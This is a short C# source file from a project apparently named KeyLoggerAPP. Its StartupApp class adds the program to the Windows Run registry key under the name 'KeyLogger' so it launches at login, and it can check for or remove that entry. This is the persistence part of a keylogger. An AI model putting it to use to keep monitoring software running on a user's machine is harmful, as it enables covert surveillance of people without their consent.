using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Linq;

namespace KeyLoggerAPP
{
    public class StartupApp : IDisposable
    {
        private readonly string registryKeyName = "KeyLogger";
        private readonly RegistryKey RegistryKey;
        public StartupApp()
        {
            RegistryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
        }
        public void SetStartup()
        {
            RegistryKey.SetValue(registryKeyName, Process.GetCurrentProcess().MainModule.FileName);
        }
        public bool StartWithWindows()
        {
            return RegistryKey.GetValueNames().Any(x => x == registryKeyName);
        }

        public void RemoveStartWithWindows()
        {
            RegistryKey.DeleteValue(registryKeyName);
        }
        public void Dispose()
        {
            RegistryKey.Close();
        }
    }
}
